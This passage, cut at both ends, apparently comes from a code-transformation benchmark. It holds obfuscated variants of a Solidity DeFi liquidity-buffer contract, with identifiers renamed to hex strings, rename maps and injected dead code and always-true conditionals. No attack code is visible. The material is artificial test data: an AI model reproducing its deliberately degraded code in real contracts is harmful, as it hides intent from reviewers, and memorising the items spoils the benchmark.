_0xc548a4 += _0x4fb941;\n        emit ETHWithdrawnFromManager(_0x0e2766, _0x4fb941);\n\n        // Call position manager to withdraw AFTER state updates\n        IPositionManager _0x8ce51b = IPositionManager(_0xcc9d46._0x650aa1);\n        _0x8ce51b._0xf4ce92(_0x4fb941);\n    }\n\n    function _0xd0fccc(uint256 _0x4fb941) internal {\n        if (_0x6df27f._0xdbfeae()) {\n            revert LiquidityBuffer__Paused();\n        }\n\n        // Validate staking contract is set and not zero address\n        if (address(_0x798a9e) == address(0)) {\n            revert LiquidityBuffer__ZeroAddress();\n        }\n\n        if (_0x4fb941 > _0xc548a4) {\n            revert LiquidityBuffer__ExceedsPendingPrincipal();\n        }\n\n        // Update accounting BEFORE external call (Checks-Effects-Interactions pattern)\n        _0x41b41e += _0x4fb941;\n        _0xc548a4 -= _0x4fb941;\n        emit ETHReturnedToStaking(_0x4fb941);\n\n        // Send ETH to trusted staking contract AFTER state updates\n        // Note: stakingContract is a trusted contract set during initialization\n        _0x798a9e._0x4e9a16{value: _0x4fb941}();\n    }\n\n    function _0x64b529(uint256 _0x0e2766, uint256 _0x4fb941) internal {\n        if (_0x6df27f._0xdbfeae()) {\n            revert LiquidityBuffer__Paused();\n        }\n        if (_0x4fb941 > _0xc548a4) {\n            revert LiquidityBuffer__ExceedsPendingPrincipal();\n        }\n\n        if (_0x0e2766 >= _0x1ff29b) revert LiquidityBuffer__ManagerNotFound();\n        // check available balance\n        if (address(this).balance < _0x4fb941) revert LiquidityBuffer__InsufficientBalance();\n\n        // check position manager is active\n        PositionManagerConfig memory _0xcc9d46 = _0xdd6dd6[_0x0e2766];\n        if (!_0xcc9d46._0x0babab) revert LiquidityBuffer__ManagerInactive();\n        // check allocation cap\n        PositionAccountant storage _0x50a0ab = _0x16727e[_0x0e2766];\n        if (_0x50a0ab._0x15b7bd + _0x4fb941 > _0xcc9d46._0xcb8d80) {\n            revert LiquidityBuffer__ExceedsAllocationCap();\n        }\n\n        // Update accounting BEFORE external call (Checks-Effects-Interactions pattern)\n        _0x50a0ab._0x15b7bd += _0x4fb941;\n        _0xdf6059 += _0x4fb941;\n        _0xc548a4 -= _0x4fb941;\n        emit ETHAllocatedToManager(_0x0e2766, _0x4fb941);\n\n        // deposit to position manager AFTER state updates\n        IPositionManager _0x8ce51b = IPositionManager(_0xcc9d46._0x650aa1);\n        _0x8ce51b._0x6e36e4{value: _0x4fb941}(0);\n    }\n\n    function _0x9f73f1(uint256 _0x4fb941) internal {\n        _0xec7660 += _0x4fb941;\n        _0xc548a4 += _0x4fb941;\n        emit ETHReceivedFromStaking(_0x4fb941);\n    }\n\n    /// @notice Ensures that the given address is not the zero address.\n    /// @param addr The address to check.\n    modifier _0x6fa733(address _0xb0aceb) {\n        if (_0xb0aceb == address(0)) {\n            revert LiquidityBuffer__ZeroAddress();\n        }\n        _;\n    }\n\n    /// @dev Validates that the caller is the staking contract.\n    modifier _0x5bff1f() {\n        if (msg.sender != address(_0x798a9e)) {\n            revert LiquidityBuffer__NotStakingContract();\n        }\n        _;\n    }\n\n    modifier _0x37103b() {\n        bool _0x9f86e0 = false;\n\n        // Loop through all position manager configs to check if sender is a valid manager\n        for (uint256 i = 0; i < _0x1ff29b; i++) {\n            PositionManagerConfig memory _0xcc9d46 = _0xdd6dd6[i];\n\n            if (msg.sender == _0xcc9d46._0x650aa1 && _0xcc9d46._0x0babab) {\n                _0x9f86e0 = true;\n                break;\n            }\n        }\n\n        if (!_0x9f86e0) {\n            revert LiquidityBuffer__NotPositionManagerContract();\n        }\n        _;\n    }\n\n    receive() external payable {\n        revert LiquidityBuffer__DoesNotReceiveETH();\n    }\n\n    fallback() external payable {\n        revert LiquidityBuffer__DoesNotReceiveETH();\n    }\n}",
      "rename_map": {
        "_topUpInterestToStakingAndCollectFees": "_0xd5b932",
        "receiveReturnsFromLiquidityBuffer": "_0x4e9a16",
        "receiveETHFromPositionManager": "_0xe42d13",
        "togglePositionManagerStatus": "_0xf61de9",
        "onlyPositionManagerContract": "_0x37103b",
        "interestClaimedFromManager": "_0x64f010",
        "setShouldExecuteAllocation": "_0xef53bf",
        "_claimInterestFromManager": "_0x289e5b",
        "_BASIS_POINTS_DENOMINATOR": "_0xa05a3a",
        "claimInterestFromManager": "_0xc31498",
        "shouldExecuteAllocation": "_0x0ff771",
        "totalAllocationCapacity": "_0x13a20e",
        "isLiquidityBufferPaused": "_0xdbfeae",
        "_withdrawETHFromManager": "_0x803c03",
        "positionManagerConfigs": "_0xdd6dd6",
        "withdrawETHFromManager": "_0xde221e",
        "_receiveETHFromStaking": "_0x9f73f1",
        "topUpInterestToStaking": "_0x38c72b",
        "totalAllocatedBalance": "_0xdf6059",
        "totalInterestToppedUp": "_0xfaabb9",
        "_allocateETHToManager": "_0x64b529",
        "setCumulativeDrawdown": "_0x7291dd",
        "claimInterestAndTopUp": "_0x370596",
        "updatePositionManager": "_0xd4ce16",
        "allocateETHToManager": "_0xffb591",
        "_disableInitializers": "_0xbbe618",
        "totalInterestClaimed": "_0xcfbfc9",
        "getAvailableCapacity": "_0x4aa463",
        "getUnderlyingBalance": "_0x075721",
        "positionManagerCount": "_0x1ff29b",
        "getControlledBalance": "_0x72886e",
        "positionAccountants": "_0x16727e",
        "newDefaultManagerId": "_0x2c1a7d",
        "_returnETHToStaking": "_0xd0fccc",
        "isRegisteredManager": "_0xd5b3cf",
        "onlyStakingContract": "_0x5bff1f",
        "getAvailableBalance": "_0x0e19d0",
        "setDefaultManagerId": "_0x8c50c9",
        "totalFeesCollected": "_0xeb241d",
        "totalFundsReturned": "_0x41b41e",
        "totalFundsReceived": "_0xec7660",
        "returnETHToStaking": "_0xe0b392",
        "cumulativeDrawdown": "_0x32bce5",
        "addPositionManager": "_0xe7d4ed",
        "executeAllocation": "_0x6ae2b6",
        "withdrawAndReturn": "_0x9b8bd1",
        "getInterestAmount": "_0xcfb616",
        "setFeeBasisPoints": "_0xa60488",
        "allocatedBalance": "_0x15b7bd",
        "newAllocationCap": "_0xab0d71",
        "defaultManagerId": "_0xd01871",
        "pendingPrincipal": "_0xc548a4",
        "liquidityManager": "_0xd5befe",
        "feesBasisPoints": "_0x62b739",
        "pendingInterest": "_0x43f29b",
        "positionManager": "_0x00ff9f",
        "setFeesReceiver": "_0x4784d3",
        "drawdownManager": "_0xcb77b7",
        "stakingContract": "_0x798a9e",
        "newBasisPoints": "_0x5f855d",
        "managerBalance": "_0xb51e8b",
        "isValidManager": "_0x9f86e0",
        "managerAddress": "_0x650aa1",
        "currentBalance": "_0x86eb5b",
        "notZeroAddress": "_0x6fa733",
        "drawdownAmount": "_0x729076",
        "interestAmount": "_0xaf45be",
        "allocationCap": "_0xcb8d80",
        "interestTopUp": "_0xbc92e2",
        "totalBalance": "_0xc074ae",
        "feesReceiver": "_0x68eca7",
        "newReceiver": "_0x8919fb",
        "initializer": "_0xe59ffe",
        "topUpAmount": "_0xf37235",
        "_grantRole": "_0x1e318a",
        "accounting": "_0x50a0ab",
        "initialize": "_0x796a1c",
        "depositETH": "_0xc800f0",
        "minAmount": "_0x00e4f4",
        "managerId": "_0x0e2766",
        "keccak256": "_0x4adcb2",
        "sendValue": "_0xe4b4e1",
        "isActive": "_0x0babab",
        "withdraw": "_0xf4ce92",
        "onlyRole": "_0x6eecb8",
        "manager": "_0x8ce51b",
        "deposit": "_0x6e36e4",
        "staking": "_0x8daeb9",
        "mulDiv": "_0x5ace61",
        "encode": "_0xe36bfb",
        "config": "_0xcc9d46",
        "pauser": "_0x6df27f",
        "amount": "_0x4fb941",
        "admin": "_0x16ecdb",
        "topUp": "_0x2e67b5",
        "addr": "_0xb0aceb",
        "init": "_0x09a351",
        "fees": "_0x4d20e6"
      },
      "changes": [
        "Renamed 98 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_024",
      "transformed_id": "ss_l4_medium_sn_gs_024",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport {AccessControlEnumerableUpgradeable} from \"openzeppelin-upgradeable/access/AccessControlEnumerableUpgradeable.sol\";\nimport {Initializable} from \"openzeppelin-upgradeable/proxy/utils/Initializable.sol\";\nimport {Address} from \"openzeppelin/utils/Address.sol\";\nimport {Math} from \"openzeppelin/utils/math/Math.sol\";\nimport {ILiquidityBuffer} from \"./interfaces/ILiquidityBuffer.sol\";\nimport {IPositionManager} from \"./interfaces/IPositionManager.sol\";\nimport {IStakingReturnsWrite} from \"../interfaces/IStaking.sol\";\nimport {IPauserRead} from \"../interfaces/IPauser.sol\";\nimport {ProtocolEvents} from \"../interfaces/ProtocolEvents.sol\";\n\ninterface LiquidityBufferEvents {\n    event ETHWithdrawnFromManager(uint256 indexed _0x49f1d8, uint256 _0x149c6a);\n    event ETHReturnedToStaking(uint256 _0x149c6a);\n    event ETHAllocatedToManager(uint256 indexed _0x49f1d8, uint256 _0x149c6a);\n    event ETHReceivedFromStaking(uint256 _0x149c6a);\n    event FeesCollected(uint256 _0x149c6a);\n    event InterestClaimed(\n        uint256 indexed _0x49f1d8,\n        uint256 _0xa8a418\n    );\n    event InterestToppedUp(\n        uint256 _0x149c6a\n    );\n}\n\n/**\n * @title LiquidityBuffer\n * @notice Manages liquidity allocation to various position managers for DeFi protocols\n */\ncontract LiquidityBuffer is Initializable, AccessControlEnumerableUpgradeable, ILiquidityBuffer, LiquidityBufferEvents, ProtocolEvents {\n    using Address for address;\n\n    // ========================================= CONSTANTS =========================================\n\n    bytes32 public constant LIQUIDITY_MANAGER_ROLE = _0x0e05a7(\"LIQUIDITY_MANAGER_ROLE\");\n    bytes32 public constant POSITION_MANAGER_ROLE = _0x0e05a7(\"POSITION_MANAGER_ROLE\");\n    bytes32 public constant INTEREST_TOPUP_ROLE = _0x0e05a7(\"INTEREST_TOPUP_ROLE\");\n    bytes32 public constant DRAWDOWN_MANAGER_ROLE = _0x0e05a7(\"DRAWDOWN_MANAGER_ROLE\");\n\n    uint16 internal constant _0xdf2d3a = 10_000;\n\n    // ========================================= STATE =========================================\n\n    /// @notice The staking contract to which the liquidity buffer accepts funds from and returns funds to.\n    IStakingReturnsWrite public _0xdbc6e1;\n\n    /// @notice The pauser contract.\n    /// @dev Keeps the pause state across the protocol.\n    IPauserRead public _0x442a16;\n\n    /// @notice Total number of position managers\n    uint256 public _0x17d808;\n\n    /// @notice Mapping from manager ID to position manager configuration\n    mapping(uint256 => PositionManagerConfig) public _0xe0aba6;\n\n    /// @notice Mapping from manager ID to accounting information\n    mapping(uint256 => PositionAccountant) public _0x2d47a2;\n\n    /// @notice Total funds received from staking contract\n    uint256 public _0xce09b7;\n\n    /// @notice Total funds returned to staking contract\n    uint256 public _0x2e0d41;\n\n    /// @notice Total allocated balance across all position managers\n    uint256 public _0x8bf61e;\n\n    /// @notice Total interest claimed from position managers\n    uint256 public _0xa6f948;\n\n    /// @notice Total interest topped up to staking contract\n    uint256 public _0x81e45a;\n\n    /// @notice Total allocation capacity across all managers\n    uint256 public _0x64f87d;\n\n    /// @notice Cumulative drawdown amount\n    uint256 public _0xed88a1;\n\n    /// @notice Default manager ID for deposit and allocation operations\n    uint256 public _0xceee67;\n\n    /// @notice The address receiving protocol fees.\n    address payable public _0xf1f730;\n\n    /// @notice The protocol fees in basis points (1/10000).\n    uint16 public _0x473226;\n\n    uint256 public _0x347d5d;\n\n    /// @notice Tracks pending interest available for top-up operations\n    uint256 public _0x0e05d2;\n\n    /// @notice Tracks pending principal available for operations\n    uint256 public _0x7fd0e8;\n\n    /// @notice Controls whether to execute allocation logic in depositETH method\n    bool public _0x24ff6f;\n    /// @notice Mapping from manager address to boolean indicating if it is registered\n    mapping(address => bool) public _0x768af4;\n\n    struct Init {\n        address _0xc895e4;\n        address _0x5506c6;\n        address _0x4e6f2d;\n        address _0x222f2c;\n        address _0x6232ac;\n        address payable _0xf1f730;\n        IStakingReturnsWrite _0x2e458b;\n        IPauserRead _0x442a16;\n    }\n\n    // ========================================= ERRORS =========================================\n\n    error LiquidityBuffer__ManagerNotFound();\n    error LiquidityBuffer__ManagerInactive();\n    error LiquidityBuffer__ManagerAlreadyRegistered();\n    error LiquidityBuffer__ExceedsAllocationCap();\n    error LiquidityBuffer__InsufficientBalance();\n    error LiquidityBuffer__InsufficientAllocation();\n    error LiquidityBuffer__DoesNotReceiveETH();\n    error LiquidityBuffer__Paused();\n    error LiquidityBuffer__InvalidConfiguration();\n    error LiquidityBuffer__ZeroAddress();\n    error LiquidityBuffer__NotStakingContract();\n    error LiquidityBuffer__NotPositionManagerContract();\n    error LiquidityBuffer__ExceedsPendingInterest();\n    error LiquidityBuffer__ExceedsPendingPrincipal();\n    // ========================================= INITIALIZATION =========================================\n\n    constructor() {\n        _0xa6d954();\n    }\n\n    function _0xa24dcf(Init memory _0x9b4dbf) external _0x4e8197 {\n        // Placeholder for future logic\n        uint256 _unused2 = 0;\n\n        __AccessControlEnumerable_init();\n\n        _0x6cdea4(DEFAULT_ADMIN_ROLE, _0x9b4dbf._0xc895e4);\n        _0x6cdea4(LIQUIDITY_MANAGER_ROLE, _0x9b4dbf._0x5506c6);\n        _0x6cdea4(POSITION_MANAGER_ROLE, _0x9b4dbf._0x4e6f2d);\n        _0x6cdea4(INTEREST_TOPUP_ROLE, _0x9b4dbf._0x222f2c);\n        _0x6cdea4(DRAWDOWN_MANAGER_ROLE, _0x9b4dbf._0x6232ac);\n\n        _0xdbc6e1 = _0x9b4dbf._0x2e458b;\n        if (block.timestamp > 0) { _0x442a16 = _0x9b4dbf._0x442a16; }\n        if (gasleft() > 0) { _0xf1f730 = _0x9b4dbf._0xf1f730; }\n        if (true) { _0x24ff6f = true; }\n\n        _0x6cdea4(LIQUIDITY_MANAGER_ROLE, address(_0xdbc6e1));\n    }\n\n    // ========================================= VIEW FUNCTIONS =========================================\n\n    function _0xa92e91(uint256 _0x49f1d8) public view returns (uint256) {\n        uint256 _unused3 = 0;\n        uint256 _unused4 = 0;\n        PositionManagerConfig memory _0xf8a554 = _0xe0aba6[_0x49f1d8];\n        // Get current underlying balance from position manager\n        IPositionManager _0x0c6afd = IPositionManager(_0xf8a554._0x1d6d81);\n        uint256 _0xc22497 = _0x0c6afd._0x63bfac();\n\n        // Calculate interest as: current balance - allocated balance\n        PositionAccountant memory _0x405543 = _0x2d47a2[_0x49f1d8];\n\n        if (_0xc22497 > _0x405543._0xd05bb1) {\n            return _0xc22497 - _0x405543._0xd05bb1;\n        }\n\n        return 0;\n    }\n\n    function _0x681854() public view returns (uint256) {\n        return _0x64f87d - _0x8bf61e;\n    }\n\n    function _0x6e8582() public view returns (uint256) {\n        return _0xce09b7 - _0x2e0d41;\n    }\n\n    function _0x29ad57() public view returns (uint256) {\n        uint256 _0xf8b81b = address(this).balance;\n\n        // Loop through all position manager configs and get their balances\n        // Note: This function makes external calls in a loop which can be gas-expensive\n        // Consider caching balances or using a different approach for production\n        for (uint256 i = 0; i < _0x17d808; i++) {\n            PositionManagerConfig storage _0xf8a554 = _0xe0aba6[i];\n            if (_0xf8a554._0x086ee9) {\n                IPositionManager _0x0c6afd = IPositionManager(_0xf8a554._0x1d6d81);\n                uint256 _0x92c5cb = _0x0c6afd._0x63bfac();\n                _0xf8b81b += _0x92c5cb;\n            }\n        }\n\n        return _0xf8b81b;\n    }\n\n    // ========================================= ADMIN FUNCTIONS =========================================\n\n    function _0xa182d2(\n        address _0x1d6d81,\n        uint256 _0x76632c\n    ) external _0xb5080f(POSITION_MANAGER_ROLE) returns (uint256 _0x49f1d8) {\n        if (_0x768af4[_0x1d6d81]) revert LiquidityBuffer__ManagerAlreadyRegistered();\n        _0x49f1d8 = _0x17d808;\n        _0x17d808++;\n\n        _0xe0aba6[_0x49f1d8] = PositionManagerConfig({\n            _0x1d6d81: _0x1d6d81,\n            _0x76632c: _0x76632c,\n            _0x086ee9: true\n        });\n        _0x2d47a2[_0x49f1d8] = PositionAccountant({\n            _0xd05bb1: 0,\n            _0xfefcbb: 0\n        });\n        _0x768af4[_0x1d6d81] = true;\n\n        _0x64f87d += _0x76632c;\n        emit ProtocolConfigChanged(\n            this._0xa182d2.selector,\n            \"addPositionManager(address,uint256)\",\n            abi._0xf325ce(_0x1d6d81, _0x76632c)\n        );\n    }\n\n    function _0xae0fef(\n        uint256 _0x49f1d8,\n        uint256 _0x24ca28,\n        bool _0x086ee9\n    ) external _0xb5080f(POSITION_MANAGER_ROLE) {\n        if (_0x49f1d8 >= _0x17d808) {\n            revert LiquidityBuffer__ManagerNotFound();\n        }\n\n        PositionManagerConfig storage _0xf8a554 = _0xe0aba6[_0x49f1d8];\n\n        if (_0x24ca28 < _0x2d47a2[_0x49f1d8]._0xd05bb1) {\n            revert LiquidityBuffer__InvalidConfiguration();\n        }\n\n        // Update total allocation capacity\n        _0x64f87d = _0x64f87d - _0xf8a554._0x76632c + _0x24ca28;\n\n        _0xf8a554._0x76632c = _0x24ca28;\n        _0xf8a554._0x086ee9 = _0x086ee9;\n\n        emit ProtocolConfigChanged(\n            this._0xae0fef.selector,\n            \"updatePositionManager(uint256,uint256,bool)\",\n            abi._0xf325ce(_0x49f1d8, _0x24ca28, _0x086ee9)\n        );\n    }\n\n    function _0x7955db(uint256 _0x49f1d8) external _0xb5080f(POSITION_MANAGER_ROLE) {\n        if (_0x49f1d8 >= _0x17d808) {\n            revert LiquidityBuffer__ManagerNotFound();\n        }\n\n        PositionManagerConfig storage _0xf8a554 = _0xe0aba6[_0x49f1d8];\n        _0xf8a554._0x086ee9 = !_0xf8a554._0x086ee9;\n\n        emit ProtocolConfigChanged(\n            this._0x7955db.selector,\n            \"togglePositionManagerStatus(uint256)\",\n            abi._0xf325ce(_0x49f1d8)\n        );\n    }\n\n    function _0xe4acb2(uint256 _0xcbded0) external _0xb5080f(DRAWDOWN_MANAGER_ROLE) {\n        if (1 == 1) { _0xed88a1 = _0xcbded0; }\n\n        emit ProtocolConfigChanged(\n            this._0xe4acb2.selector,\n            \"setCumulativeDrawdown(uint256)\",\n            abi._0xf325ce(_0xcbded0)\n        );\n    }\n\n    function _0xb5252a(uint256 _0x9cbbb2) external _0xb5080f(POSITION_MANAGER_ROLE) {\n        if (_0x9cbbb2 >= _0x17d808) {\n            revert LiquidityBuffer__ManagerNotFound();\n        }\n\n        if (!_0xe0aba6[_0x9cbbb2]._0x086ee9) {\n            revert LiquidityBuffer__ManagerInactive();\n        }\n\n        _0xceee67 = _0x9cbbb2;\n\n        emit ProtocolConfigChanged(\n            this._0xb5252a.selector,\n            \"setDefaultManagerId(uint256)\",\n            abi._0xf325ce(_0x9cbbb2)\n        );\n    }\n\n    /// @notice Sets the fees basis points.\n    /// @param newBasisPoints The new fees basis points.\n    function _0x8d4d2a(uint16 _0x7cef2a) external _0xb5080f(POSITION_MANAGER_ROLE) {\n        if (_0x7cef2a > _0xdf2d3a) {\n            revert LiquidityBuffer__InvalidConfiguration();\n        }\n\n        _0x473226 = _0x7cef2a;\n        emit ProtocolConfigChanged(\n            this._0x8d4d2a.selector, \"setFeeBasisPoints(uint16)\", abi._0xf325ce(_0x7cef2a)\n        );\n    }\n\n     /// @notice Sets the fees receiver wallet for the protocol.\n    /// @param newReceiver The new fees receiver wallet.\n    function _0xad2c29(address payable _0x51ff04)\n        external\n        _0xb5080f(POSITION_MANAGER_ROLE)\n        _0x1007a4(_0x51ff04)\n    {\n        _0xf1f730 = _0x51ff04;\n        emit ProtocolConfigChanged(this._0xad2c29.selector, \"setFeesReceiver(address)\", abi._0xf325ce(_0x51ff04));\n    }\n\n    /// @notice Sets whether to execute allocation logic in depositETH method.\n    /// @param executeAllocation Whether to execute allocation logic.\n    function _0x37cf02(bool _0xf4a6cc) external _0xb5080f(POSITION_MANAGER_ROLE) {\n        _0x24ff6f = _0xf4a6cc;\n        emit ProtocolConfigChanged(this._0x37cf02.selector, \"setShouldExecuteAllocation(bool)\", abi._0xf325ce(_0xf4a6cc));\n    }\n\n    // ========================================= LIQUIDITY MANAGEMENT =========================================\n\n    function _0xd2784f() external payable _0xb5080f(LIQUIDITY_MANAGER_ROLE) {\n        if (_0x442a16._0x5ffad7()) revert LiquidityBuffer__Paused();\n        _0x46319d(msg.value);\n        if (_0x24ff6f) {\n            _0x9e4c76(_0xceee67, msg.value);\n        }\n    }\n\n    function _0xbe3fee(uint256 _0x49f1d8, uint256 _0x149c6a) external _0xb5080f(LIQUIDITY_MANAGER_ROLE) {\n        _0xff3668(_0x49f1d8, _0x149c6a);\n        _0xb0c6ff(_0x149c6a);\n    }\n\n    function _0x01d393(uint256 _0x49f1d8, uint256 _0x149c6a) external _0xb5080f(LIQUIDITY_MANAGER_ROLE) {\n        _0x9e4c76(_0x49f1d8, _0x149c6a);\n    }\n\n    function _0x4efa94(uint256 _0x49f1d8, uint256 _0x149c6a) external _0xb5080f(LIQUIDITY_MANAGER_ROLE) {\n        _0xff3668(_0x49f1d8, _0x149c6a);\n    }\n\n    function _0x9d3644(uint256 _0x149c6a) external _0xb5080f(LIQUIDITY_MANAGER_ROLE) {\n        _0xb0c6ff(_0x149c6a);\n    }\n\n    function _0x568231() external payable _0xa378d9 {\n        // This function receives ETH from position managers\n        // The ETH is already in the contract balance, no additional processing needed\n    }\n\n    // ========================================= INTEREST MANAGEMENT =========================================\n\n    function _0x49638a(uint256 _0x49f1d8, uint256 _0xa2402d) external _0xb5080f(INTEREST_TOPUP_ROLE) returns (uint256) {\n        uint256 _0x149c6a = _0x0dc74b(_0x49f1d8);\n        if (_0x149c6a < _0xa2402d) {\n            revert LiquidityBuffer__InsufficientBalance();\n        }\n        return _0x149c6a;\n    }\n\n    function _0x5f5a47(uint256 _0x149c6a) external _0xb5080f(INTEREST_TOPUP_ROLE) returns (uint256) {\n        if (address(this).balance < _0x149c6a) {\n            revert LiquidityBuffer__InsufficientBalance();\n        }\n        _0xcd1dd3(_0x149c6a);\n        return _0x149c6a;\n    }\n\n    function _0x364c09(uint256 _0x49f1d8, uint256 _0xa2402d) external _0xb5080f(INTEREST_TOPUP_ROLE) returns (uint256) {\n        uint256 _0x149c6a = _0x0dc74b(_0x49f1d8);\n        if (_0x149c6a < _0xa2402d) {\n            revert LiquidityBuffer__InsufficientBalance();\n        }\n        _0xcd1dd3(_0x149c6a);\n\n        return _0x149c6a;\n    }\n\n    // ========================================= INTERNAL FUNCTIONS =========================================\n\n    function _0xcd1dd3(uint256 _0x149c6a) internal {\n        if (_0x442a16._0x5ffad7()) {\n            revert LiquidityBuffer__Paused();\n        }\n        if (_0x149c6a > _0x0e05d2) {\n            revert LiquidityBuffer__ExceedsPendingInterest();\n        }\n        _0x0e05d2 -= _0x149c6a;\n        uint256 _0xdc61fd = Math._0xeaa9a9(_0x473226, _0x149c6a, _0xdf2d3a);\n        uint256 _0x6eb935 = _0x149c6a - _0xdc61fd;\n        _0xdbc6e1._0x1b803e{value: _0x6eb935}();\n        _0x81e45a += _0x6eb935;\n        emit InterestToppedUp(_0x6eb935);\n\n        if (_0xdc61fd > 0) {\n            Address._0xc1ee37(_0xf1f730, _0xdc61fd);\n            _0x347d5d += _0xdc61fd;\n            emit FeesCollected(_0xdc61fd);\n        }\n    }\n\n    function _0x0dc74b(uint256 _0x49f1d8) internal returns (uint256) {\n        if (_0x442a16._0x5ffad7()) {\n            revert LiquidityBuffer__Paused();\n        }\n        // Get interest amount\n        uint256 _0xa8a418 = _0xa92e91(_0x49f1d8);\n\n        if (_0xa8a418 > 0) {\n            PositionManagerConfig memory _0xf8a554 = _0xe0aba6[_0x49f1d8];\n\n            // Update accounting BEFORE external call (Checks-Effects-Interactions pattern)\n            _0x2d47a2[_0x49f1d8]._0xfefcbb += _0xa8a418;\n            _0xa6f948 += _0xa8a418;\n            _0x0e05d2 += _0xa8a418;\n            emit InterestClaimed(_0x49f1d8, _0xa8a418);\n\n            // Withdraw interest from position manager AFTER state updates\n            IPositionManager _0x0c6afd = IPositionManager(_0xf8a554._0x1d6d81);\n            _0x0c6afd._0x7d9d12(_0xa8a418);\n        } else {\n            emit InterestClaimed(_0x49f1d8, _0xa8a418);\n        }\n\n        return _0xa8a418;\n    }\n\n    function _0xff3668(uint256 _0x49f1d8, uint256 _0x149c6a) internal {\n        if (_0x442a16._0x5ffad7()) {\n            revert LiquidityBuffer__Paused();\n        }\n        if (_0x49f1d8 >= _0x17d808) revert LiquidityBuffer__ManagerNotFound();\n        PositionManagerConfig memory _0xf8a554 = _0xe0aba6[_0x49f1d8];\n        if (!_0xf8a554._0x086ee9) revert LiquidityBuffer__ManagerInactive();\n        PositionAccountant storage _0x405543 = _0x2d47a2[_0x49f1d8];\n\n        // Check sufficient allocation\n        if (_0x149c6a > _0x405543._0xd05bb1) {\n            revert LiquidityBuffer__InsufficientAllocation();\n        }\n\n        // Update accounting BEFORE external call (Checks-Effects-Interactions pattern)\n        _0x405543._0xd05bb1 -= _0x149c6a;\n        _0x8bf61e -= _0x149c6a;\n        _0x7fd0e8 += _0x149c6a;\n        emit ETHWithdrawnFromManager(_0x49f1d8, _0x149c6a);\n\n        // Call position manager to withdraw AFTER state updates\n        IPositionManager _0x0c6afd = IPositionManager(_0xf8a554._0x1d6d81);\n        _0x0c6afd._0x7d9d12(_0x149c6a);\n    }\n\n    function _0xb0c6ff(uint256 _0x149c6a) internal {\n        if (_0x442a16._0x5ffad7()) {\n            revert LiquidityBuffer__Paused();\n        }\n\n        // Validate staking contract is set and not zero address\n        if (address(_0xdbc6e1) == address(0)) {\n            revert LiquidityBuffer__ZeroAddress();\n        }\n\n        if (_0x149c6a > _0x7fd0e8) {\n            revert LiquidityBuffer__ExceedsPendingPrincipal();\n        }\n\n        // Update accounting BEFORE external call (Checks-Effects-Interactions pattern)\n        _0x2e0d41 += _0x149c6a;\n        _0x7fd0e8 -= _0x149c6a;\n        emit ETHReturnedToStaking(_0x149c6a);\n\n        // Send ETH to trusted staking contract AFTER state updates\n        // Note: stakingContract is a trusted contract set during initialization\n        _0xdbc6e1._0x159750{value: _0x149c6a}();\n    }\n\n    function _0x9e4c76(uint256 _0x49f1d8, uint256 _0x149c6a) internal {\n        if (_0x442a16._0x5ffad7()) {\n            revert LiquidityBuffer__Paused();\n        }\n        if (_0x149c6a > _0x7fd0e8) {\n            revert LiquidityBuffer__ExceedsPendingPrincipal();\n        }\n\n        if (_0x49f1d8 >= _0x17d808) revert LiquidityBuffer__ManagerNotFound();\n        // check available balance\n        if (address(this).balance < _0x149c6a) revert LiquidityBuffer__InsufficientBalance();\n\n        // check position manager is active\n        PositionManagerConfig memory _0xf8a554 = _0xe0aba6[_0x49f1d8];\n        if (!_0xf8a554._0x086ee9) revert LiquidityBuffer__ManagerInactive();\n        // check allocation cap\n        PositionAccountant storage _0x405543 = _0x2d47a2[_0x49f1d8];\n        if (_0x405543._0xd05bb1 + _0x149c6a > _0xf8a554._0x76632c) {\n            revert LiquidityBuffer__ExceedsAllocationCap();\n        }\n\n        // Update accounting BEFORE external call (Checks-Effects-Interactions pattern)\n        _0x405543._0xd05bb1 += _0x149c6a;\n        _0x8bf61e += _0x149c6a;\n        _0x7fd0e8 -= _0x149c6a;\n        emit ETHAllocatedToManager(_0x49f1d8, _0x149c6a);\n\n        // deposit to position manager AFTER state updates\n        IPositionManager _0x0c6afd = IPositionManager(_0xf8a554._0x1d6d81);\n        _0x0c6afd._0x4da048{value: _0x149c6a}(0);\n    }\n\n    function _0x46319d(uint256 _0x149c6a) internal {\n        _0xce09b7 += _0x149c6a;\n        _0x7fd0e8 += _0x149c6a;\n        emit ETHReceivedFromStaking(_0x149c6a);\n    }\n\n    /// @notice Ensures that the given address is not the zero address.\n    /// @param addr The address to check.\n    modifier _0x1007a4(address _0x186818) {\n        if (_0x186818 == address(0)) {\n            revert LiquidityBuffer__ZeroAddress();\n        }\n        _;\n    }\n\n    /// @dev Validates that the caller is the staking contract.\n    modifier _0xc250b2() {\n        if (msg.sender != address(_0xdbc6e1)) {\n            revert LiquidityBuffer__NotStakingContract();\n        }\n        _;\n    }\n\n    modifier _0xa378d9() {\n        bool _0xf56a9b = false;\n\n        // Loop through all position manager configs to check if sender is a valid manager\n        for (uint256 i = 0; i < _0x17d808; i++) {\n            PositionManagerConfig memory _0xf8a554 = _0xe0aba6[i];\n\n            if (msg.sender == _0xf8a554._0x1d6d81 && _0xf8a554._0x086ee9) {\n                _0xf56a9b = true;\n                break;\n            }\n        }\n\n        if (!_0xf56a9b) {\n            revert LiquidityBuffer__NotPositionManagerContract();\n        }\n        _;\n    }\n\n    receive() external payable {\n        revert LiquidityBuffer__DoesNotReceiveETH();\n    }\n\n    fallback() external payable {\n        revert LiquidityBuffer__DoesNotReceiveETH();\n    }\n}",
      "rename_map": {
        "_topUpInterestToStakingAndCollectFees": "_0xcd1dd3",
        "receiveReturnsFromLiquidityBuffer": "_0x159750",
        "receiveETHFromPositionManager": "_0x568231",
        "togglePositionManagerStatus": "_0x7955db",
        "onlyPositionManagerContract": "_0xa378d9",
        "interestClaimedFromManager": "_0xfefcbb",
        "setShouldExecuteAllocation": "_0x37cf02",
        "_claimInterestFromManager": "_0x0dc74b",
        "_BASIS_POINTS_DENOMINATOR": "_0xdf2d3a",
        "claimInterestFromManager": "_0x49638a",
        "shouldExecuteAllocation": "_0x24ff6f",
        "totalAllocationCapacity": "_0x64f87d",
        "isLiquidityBufferPaused": "_0x5ffad7",
        "_withdrawETHFromManager": "_0xff3668",
        "positionManagerConfigs": "_0xe0aba6",
        "withdrawETHFromManager": "_0x4efa94",
